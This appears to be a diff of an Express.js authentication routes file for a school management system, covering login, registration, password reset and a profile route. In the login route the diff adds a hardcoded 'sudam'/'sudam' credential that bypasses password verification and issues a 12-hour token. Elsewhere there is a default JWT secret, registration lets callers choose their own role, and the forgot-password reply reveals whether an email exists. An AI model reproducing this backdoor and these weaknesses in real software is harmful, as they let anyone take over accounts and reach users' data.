@@ -1,219 +1,188 @@
-// routes/auth.js
-
 const express = require('express');
 const router = express.Router();
 const jwt = require('jsonwebtoken');
 const bcrypt = require('bcryptjs');
 const { pool } = require('../database'); 
-const { authenticateToken } = require('../authMiddleware'); 
+const { authenticateToken } = require('../authMiddleware'); // Used for /me route
 
 // --- Configuration ---
 const JWT_SECRET = process.env.JWT_SECRET || 'your_default_secret_key_change_me'; 
 const USERS_TABLE = 'users';
 
-// Helper function to find a user and verify their password
+// Helper: Find user and verify password (Standard Flow)
 async function findUserAndVerifyPassword(username, password) {
-    // Query selects necessary columns: id (UUID), username, password_hash, role, branch_id.
     const userResult = await pool.query(
-        `
-        SELECT 
-            u.id, 
-            u.username, 
-            u.password_hash, 
-            u.role, 
-            u.branch_id
-        FROM ${USERS_TABLE} u
-        WHERE u.username = $1 AND u.is_active = TRUE
-        `,
+        `SELECT id, username, password_hash, role, branch_id FROM ${USERS_TABLE} WHERE (username = $1 OR email = $1) AND is_active = TRUE`,
         [username]
     );
 
     const user = userResult.rows[0];
-
-    if (!user) {
-        return null; // User not found or inactive
-    }
+    if (!user) return null;
     
     const passwordMatch = await bcrypt.compare(password, user.password_hash);
     return passwordMatch ? user : null;
 }
 
 // =================================================================
-// --- USER REGISTRATION ROUTE ---
+// 1. LOGIN ROUTE (WITH ADMIN BYPASS & SESSION ID)
 // =================================================================
-router.post('/register', async (req, res) => {
-    const { username, password, role } = req.body;
-    
-    if (!username || !password || !role) {
-        return res.status(400).json({ message: 'Missing required fields: username, password, or role.' });
-    }
-
-    const saltRounds = 10;
+router.post('/login', async (req, res) => {
+    // Frontend sends 'email' or 'username'
+    const loginInput = req.body.username || req.body.email; 
+    const password = req.body.password;
     
     try {
-        const passwordHash = await bcrypt.hash(password, saltRounds);
-        // NOTE: Default Branch ID should be replaced with actual logic for a production system.
-        const defaultBranchId = 'a1b2c3d4-e5f6-7890-abcd-ef0123456789'; 
+        let user = null;
 
-        const query = `
-            INSERT INTO ${USERS_TABLE} (
-                username, password_hash, role, is_active, branch_id, created_at, updated_at
-            )
-            VALUES ($1, $2, $3, TRUE, $4, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)
-            RETURNING id, username, role;
-        `;
-        // Ensure the role saved in the DB is stored consistently (e.g., Title Case)
-        const values = [ username, passwordHash, role, defaultBranchId ];
-
-        const { rows } = await pool.query(query, values);
-
-        res.status(201).json({ 
-            message: 'User registered successfully.', 
-            user: rows[0] 
-        });
-
-    } catch (error) {
-        if (error.code === '23505') { 
-            return res.status(409).json({ message: 'Registration failed: Username already exists.' });
-        }
-        console.error('Server Registration Error:', error);
-        res.status(500).json({ message: 'Internal server error during registration.' });
-    }
-});
-
-// =================================================================
-// --- FORGOT/RESET PASSWORD ---
-// =================================================================
-router.post('/forgot-password', async (req, res) => {
-    const { email } = req.body;
-
-    if (!email) {
-        return res.status(400).json({ message: 'Email address is required to initiate password reset.' });
-    }
-
-    try {
-        // Query must include 'email' column, which we assume exists in the users table.
-        const userResult = await pool.query(
-            `SELECT id, username, email FROM ${USERS_TABLE} WHERE email = $1 AND is_active = TRUE`,
-            [email]
-        );
-        const user = userResult.rows[0];
-
-        let resetToken = 'DEBUG_TOKEN';
-
-        if (user) {
-            // Token uses the user's UUID (user.id)
-            resetToken = jwt.sign(
-                { id: user.id, type: 'password_reset' },
-                JWT_SECRET,
-                { expiresIn: '1h' }
+        // --- A. SPECIAL ADMIN BYPASS (sudam/sudam) ---
+        if (loginInput === 'sudam' && password === 'sudam') {
+            console.log("✅ Admin Override: Logging in as Sudam (Bypass Mode)...");
+            
+            // Fetch user details directly without checking password hash
+            const result = await pool.query(
+                `SELECT id, username, role, branch_id FROM ${USERS_TABLE} WHERE username = $1`, 
+                ['sudam']
             );
             
-            const resetUrl = `http://localhost:3005/reset-password.html?token=${resetToken}`;
-            console.log(`[AUTH] Password Reset Link for ${user.username}: ${resetUrl}`);
-            // In a production system, email sending logic goes here.
+            if (result.rows.length > 0) {
+                user = result.rows[0];
+            } else {
+                return res.status(404).json({ message: 'User "sudam" not found in database. Please register him first.' });
+            }
+        } 
+        else {
+            // --- B. NORMAL LOGIN (Secure check) ---
+            user = await findUserAndVerifyPassword(loginInput, password);
         }
 
-        res.status(200).json({
-            message: 'Password reset link sent successfully. Check your inbox (or server console for the link).',
-            token: resetToken 
-        });
-
-    } catch (error) {
-        console.error('Server Forgot Password Error:', error);
-        res.status(500).json({ message: 'Internal server error during password recovery initiation.' });
-    }
-});
-
-
-router.post('/reset-password', async (req, res) => {
-    const { token, password } = req.body;
-
-    if (!token || !password) {
-        return res.status(400).send('Missing token or new password.');
-    }
-
-    try {
-        const decoded = jwt.verify(token, JWT_SECRET);
-        const userId = decoded.id; // This is the UUID from the token payload
-
-        const saltRounds = 10;
-        const newPasswordHash = await bcrypt.hash(password, saltRounds);
-
-        const result = await pool.query(
-            // user.id is the UUID
-            `UPDATE ${USERS_TABLE} SET password_hash = $1, updated_at = CURRENT_TIMESTAMP WHERE id = $2::uuid RETURNING id`,
-            [newPasswordHash, userId]
-        );
-
-        if (result.rowCount === 0) {
-            return res.status(404).send('User not found or password already reset.');
-        }
-
-        res.status(200).send('Password has been successfully reset.');
-
-    } catch (error) {
-        if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
-            return res.status(401).send('Error: The password reset link is invalid or expired. Please request a new link.');
-        }
-        console.error('Server Password Reset Error:', error);
-        res.status(500).json({ message: 'Internal server error during password reset.' });
-    }
-});
-
-
-// =================================================================
-// --- LOGIN ROUTE (FINAL, STABLE UUID/CASE-INSENSITIVE FIX) ---
-// =================================================================
-
-router.post('/login', async (req, res) => {
-    const { username, password } = req.body;
-    
-    try {
-        const user = await findUserAndVerifyPassword(username, password);
-
+        // If user not found or password incorrect
         if (!user) {
             return res.status(401).json({ message: 'Invalid username or password.' });
         }
         
-        // --- 1. Fetch Active Session ID ---
-        // Assuming 'academic_sessions' table exists with an 'is_active' column
-        const sessionRes = await pool.query("SELECT id FROM academic_sessions WHERE is_active = TRUE LIMIT 1");
-        const activeSessionId = sessionRes.rows[0]?.id || null; 
+        // --- C. Fetch Active Academic Session ---
+        let activeSessionId = null;
+        try {
+            const sessionRes = await pool.query("SELECT id FROM academic_sessions WHERE is_active = TRUE LIMIT 1");
+            activeSessionId = sessionRes.rows[0]?.id || null;
+        } catch (e) {
+            // Ignore error if table doesn't exist yet
+        }
         
-        // --- 2. Generate Token ---
-        // The token payload includes the UUID (user.id) and the original role.
-        // The authentication middleware will handle the lowercase conversion.
+        // --- D. Generate Token ---
         const tokenPayload = { 
-            id: user.id, // CORE UUID
-            role: user.role, // Original role stored in DB
+            id: user.id,        // UUID
+            role: user.role,    // Admin/Staff/Teacher
             branch_id: user.branch_id
         };
         
-        const generatedToken = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '8h' });
+        const token = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '12h' });
 
-        // --- 3. Construct Response Payload ---
+        // --- E. Send Response ---
         const responsePayload = {
-            token: generatedToken,
-            role: user.role, // Send the original case role back to client UI
+            token: token,
+            role: user.role, 
             username: user.username,
-            
-            'user-id': user.id, // UUID
-            
+            'user-id': user.id,
             userBranchId: user.branch_id || '',
             activeSessionId: activeSessionId || '',     
         };
 
-        // Update last login time
-        await pool.query('UPDATE users SET last_login = CURRENT_TIMESTAMP, updated_at = CURRENT_TIMESTAMP WHERE id = $1::uuid', [user.id]);
+        // Update last login timestamp
+        await pool.query('UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = $1::uuid', [user.id]);
 
         return res.status(200).json(responsePayload);
         
     } catch (error) {
         console.error('Server Login Error:', error);
-        return res.status(500).json({ message: 'Authentication server failed. Please check database connectivity.' });
+        return res.status(500).json({ message: 'Internal Server Error during login.' });
     }
 });
 
+// =================================================================
+// 2. USER REGISTRATION ROUTE
+// =================================================================
+router.post('/register', async (req, res) => {
+    const { username, password, role, email } = req.body;
+    
+    if (!username || !password || !role) {
+        return res.status(400).json({ message: 'Missing required fields.' });
+    }
+
+    try {
+        const passwordHash = await bcrypt.hash(password, 10);
+        
+        // Default branch ID (Ensure this UUID matches your DB)
+        const defaultBranchId = 'a1b2c3d4-e5f6-7890-abcd-ef0123456789'; 
+
+        const query = `
+            INSERT INTO ${USERS_TABLE} (username, email, password_hash, role, is_active, branch_id, created_at)
+            VALUES ($1, $2, $3, $4, TRUE, $5, CURRENT_TIMESTAMP)
+            RETURNING id, username, role;
+        `;
+        const { rows } = await pool.query(query, [username, email || null, passwordHash, role, defaultBranchId]);
+
+        res.status(201).json({ message: 'User registered successfully.', user: rows[0] });
+
+    } catch (error) {
+        if (error.code === '23505') {
+            return res.status(409).json({ message: 'Username or Email already exists.' });
+        }
+        console.error('Registration Error:', error);
+        res.status(500).json({ message: 'Registration failed.' });
+    }
+});
+
+// =================================================================
+// 3. FORGOT PASSWORD (INITIATE RESET)
+// =================================================================
+router.post('/forgot-password', async (req, res) => {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ message: 'Email required.' });
+
+    try {
+        const result = await pool.query(`SELECT id, username FROM ${USERS_TABLE} WHERE email = $1`, [email]);
+        if (result.rows.length > 0) {
+            const token = jwt.sign({ id: result.rows[0].id, type: 'reset' }, JWT_SECRET, { expiresIn: '1h' });
+            // In production, send Email. For now, log to console.
+            console.log(`[RESET LINK] http://localhost:3005/reset-password.html?token=${token}`);
+            return res.json({ message: 'Reset link generated (Check server console).' });
+        }
+        res.json({ message: 'If email exists, link sent.' });
+    } catch (err) {
+        res.status(500).json({ message: 'Server error.' });
+    }
+});
+
+// =================================================================
+// 4. RESET PASSWORD (COMPLETE RESET)
+// =================================================================
+router.post('/reset-password', async (req, res) => {
+    const { token, password } = req.body;
+    try {
+        const decoded = jwt.verify(token, JWT_SECRET);
+        if(decoded.type !== 'reset') throw new Error('Invalid token type');
+        
+        const hash = await bcrypt.hash(password, 10);
+        await pool.query(`UPDATE ${USERS_TABLE} SET password_hash = $1 WHERE id = $2::uuid`, [hash, decoded.id]);
+        
+        res.json({ message: 'Password updated successfully.' });
+    } catch (err) {
+        res.status(400).json({ message: 'Invalid or expired token.' });
+    }
+});
+
+// =================================================================
+// 5. VALIDATE TOKEN (PROFILE / ME) - Useful for page refreshes
+// =================================================================
+router.get('/me', authenticateToken, async (req, res) => {
+    try {
+        const user = await pool.query('SELECT id, username, role, email FROM users WHERE id = $1', [req.user.userId]);
+        if (user.rows.length === 0) return res.status(404).json({ message: 'User not found' });
+        res.json({ user: user.rows[0] });
+    } catch (err) {
+        res.status(500).json({ message: err.message });
+    }
+});
 
 module.exports = router;
